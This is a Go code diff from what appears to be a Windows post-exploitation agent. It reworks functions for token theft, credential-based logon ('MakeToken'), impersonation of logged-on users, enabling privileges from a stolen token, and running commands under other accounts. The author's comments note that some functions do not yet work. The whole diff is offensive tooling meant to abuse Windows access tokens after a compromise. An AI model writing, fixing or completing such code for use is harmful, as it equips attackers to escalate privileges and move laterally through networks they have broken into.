@@ -18,9 +18,12 @@ const (
 	SecurityIdentification        = 1
 	SecurityImpersonation         = 2
 	SecurityDelegation            = 3
+	LOGON32_LOGON_BATCH           = 4 // it is said that LOGON32_LOGON_BATCH will give an unrestricted token?
 	LOGON32_LOGON_NEW_CREDENTIALS = 9
 	LOGON32_PROVIDER_DEFAULT      = 0
 	LOGON_WITH_PROFILE            = 0x00000001
+	LOGON_NETCREDENTIALS_ONLY     = 0x00000002
+	CREATE_DEFAULT_ERROR_MODE     = 0x04000000
 )
 
 // get as many privileges as possible
@@ -49,7 +52,7 @@ func closeToken(token windows.Token) error {
 	return nil
 }
 
-// TODO check if it works
+// TODO when call createProcessWithLogonW will generate a strange error
 func RunAs(domain []byte, username []byte, password []byte, cmd []byte) ([]byte, error) {
 	lpUsername := windows.StringToUTF16Ptr(string(username))
 	lpDomain := windows.StringToUTF16Ptr(string(domain))
@@ -68,7 +71,7 @@ func RunAs(domain []byte, username []byte, password []byte, cmd []byte) ([]byte,
 	// create anonymous pipe
 	err := windows.CreatePipe(&hRPipe, &hWPipe, &sa, 0)
 	if err != nil {
-		return nil, err
+		return nil, errors.New(fmt.Sprintf("CreatePipe error: %s", err))
 	}
 	defer windows.CloseHandle(hWPipe)
 	defer windows.CloseHandle(hRPipe)
@@ -78,10 +81,9 @@ func RunAs(domain []byte, username []byte, password []byte, cmd []byte) ([]byte,
 	startUpInfo.StdOutput = hWPipe
 
 	// https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithlogonw
-	// wait for it end and read result
-	_, _, err = createProcessWithLogonW.Call(uintptr(unsafe.Pointer(lpUsername)), uintptr(unsafe.Pointer(lpDomain)), uintptr(unsafe.Pointer(lpPassword)), 2, 0, uintptr(unsafe.Pointer(lpCommandLine)), 0x04000000, 0, uintptr(unsafe.Pointer(startUpInfo)), uintptr(unsafe.Pointer(procInfo)))
+	_, _, err = createProcessWithLogonW.Call(uintptr(unsafe.Pointer(lpUsername)), uintptr(unsafe.Pointer(lpDomain)), uintptr(unsafe.Pointer(lpPassword)), LOGON_WITH_PROFILE, 0, uintptr(unsafe.Pointer(lpCommandLine)), CREATE_DEFAULT_ERROR_MODE, 0, uintptr(unsafe.Pointer(startUpInfo)), uintptr(unsafe.Pointer(procInfo)))
 	if err != nil && err != windows.SEVERITY_SUCCESS {
-		return nil, err
+		return nil, errors.New(fmt.Sprintf("CreateProcessWithLogonW error: %s", err))
 	}
 	defer windows.CloseHandle(procInfo.Process)
 	defer windows.CloseHandle(procInfo.Thread)
@@ -99,12 +101,16 @@ func RunAs(domain []byte, username []byte, password []byte, cmd []byte) ([]byte,
 
 func GetPrivs(privs []string) (string, error) {
 	result := ""
-	// it always returns a invalidHandler?
-	p := windows.CurrentProcess()
 	var token windows.Token
-	err := windows.OpenProcessToken(p, windows.TOKEN_ADJUST_PRIVILEGES|windows.TOKEN_QUERY, &token)
-	if err != nil {
-		return result, err
+	// try to get privileges from stolen token
+	if isTokenValid {
+		token = stolenToken
+	} else {
+		p := windows.CurrentProcess()
+		err := windows.OpenProcessToken(p, windows.TOKEN_ADJUST_PRIVILEGES|windows.TOKEN_QUERY, &token)
+		if err != nil {
+			return result, errors.New(fmt.Sprintf("OpenProcessToken error: %s", err))
+		}
 	}
 	LUIDs := make([]windows.LUID, len(privs))
 	for i, priv := range privs {
@@ -135,7 +141,7 @@ func GetPrivs(privs []string) (string, error) {
 			} else if err == windows.SEVERITY_SUCCESS {
 				result += fmt.Sprintf("%s\n", privs[i])
 			} else {
-				return result, err
+				return result, errors.New(fmt.Sprintf("AdjustTokenPrivileges error: %s", err))
 			}
 		}
 	}
@@ -180,19 +186,21 @@ func StealToken(pid uint32) error {
 	return nil
 }
 
-// TODO check if it works
+// TODO it seems this func didn't work
 func MakeToken(domain []byte, username []byte, password []byte) error {
 	var token windows.Token
 	lpUsername := windows.StringToUTF16Ptr(string(username))
 	lpDomain := windows.StringToUTF16Ptr(string(domain))
 	lpPassword := windows.StringToUTF16Ptr(string(password))
-	_, _, err := logonUserA.Call(uintptr(unsafe.Pointer(lpUsername)), uintptr(unsafe.Pointer(lpDomain)), uintptr(unsafe.Pointer(lpPassword)), LOGON32_LOGON_NEW_CREDENTIALS, LOGON32_PROVIDER_DEFAULT, uintptr(token))
+	// TODO using LOGON32_LOGON_BATCH always say username/password error even if i'm input correct password
+	// using LOGON32_LOGON_NEW_CREDENTIALS always return no error but seems useless
+	_, _, err := logonUserA.Call(uintptr(unsafe.Pointer(lpUsername)), uintptr(unsafe.Pointer(lpDomain)), uintptr(unsafe.Pointer(lpPassword)), LOGON32_LOGON_BATCH, LOGON32_PROVIDER_DEFAULT, uintptr(unsafe.Pointer(&token)))
 	if err != nil && err != windows.SEVERITY_SUCCESS {
-		return err
+		return errors.New(fmt.Sprintf("LogonUserA error: %s", err))
 	}
 	_, _, err = impersonateLoggedOnUser.Call(uintptr(token))
 	if err != nil && err != windows.SEVERITY_SUCCESS {
-		return err
+		return errors.New(fmt.Sprintf("ImpersonateLoggedOnUser error: %s", err))
 	}
 	_ = closeToken(stolenToken)
 	err = windows.DuplicateTokenEx(token, windows.TOKEN_ADJUST_DEFAULT|windows.TOKEN_ADJUST_SESSIONID|windows.TOKEN_QUERY|windows.TOKEN_DUPLICATE|windows.TOKEN_ASSIGN_PRIMARY, nil, SecurityImpersonation, TokenPrimary, &stolenToken)
